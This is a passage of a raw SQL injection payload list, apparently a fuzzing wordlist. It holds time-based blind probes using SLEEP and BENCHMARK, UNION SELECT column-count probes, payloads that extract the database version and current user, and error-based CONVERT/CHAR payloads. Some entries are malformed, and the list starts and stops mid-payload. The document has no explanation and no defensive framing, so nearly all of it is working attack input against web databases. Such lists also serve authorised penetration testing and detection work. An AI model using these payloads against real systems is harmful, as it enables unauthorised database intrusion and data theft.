1,SLEEP(5),3# ORDER BY 1,SLEEP(5),3,4# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# ORDER BY SLEEP(5)-- ORDER BY 1,SLEEP(5)-- ORDER BY 1,SLEEP(5),3-- ORDER BY 1,SLEEP(5),3,4-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 1 UNION ALL SELECT 1,2 UNION ALL SELECT 1,2,3 UNION ALL SELECT 1,2,3,4 UNION ALL SELECT 1,2,3,4,5 UNION ALL SELECT 1,2,3,4,5,6 UNION ALL SELECT 1,2,3,4,5,6,7 UNION ALL SELECT 1,2,3,4,5,6,7,8 UNION ALL SELECT 1,2,3,4,5,6,7,8,9 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION ALL SELECT 1# UNION ALL SELECT 1,2# UNION ALL SELECT 1,2,3# UNION ALL SELECT 1,2,3,4# UNION ALL SELECT 1,2,3,4,5# UNION ALL SELECT 1,2,3,4,5,6# UNION ALL SELECT 1,2,3,4,5,6,7# UNION ALL SELECT 1,2,3,4,5,6,7,8# UNION ALL SELECT 1,2,3,4,5,6,7,8,9# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# UNION ALL SELECT 1-- UNION ALL SELECT 1,2-- UNION ALL SELECT 1,2,3-- UNION ALL SELECT 1,2,3,4-- UNION ALL SELECT 1,2,3,4,5-- UNION ALL SELECT 1,2,3,4,5,6-- UNION ALL SELECT 1,2,3,4,5,6,7-- UNION ALL SELECT 1,2,3,4,5,6,7,8-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION SELECT @@VERSION,SLEEP(5),3 UNION SELECT @@VERSION,SLEEP(5),USER(),4 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION SELECT @@VERSION,SLEEP(5),\"'3 UNION SELECT @@VERSION,SLEEP(5),\"'3'\"# UNION SELECT @@VERSION,SLEEP(5),USER(),4# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# UNION ALL SELECT USER()-- UNION ALL SELECT SLEEP(5)-- UNION ALL SELECT USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT NULL-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- AND 5650=CONVERT(INT,(UNION ALL 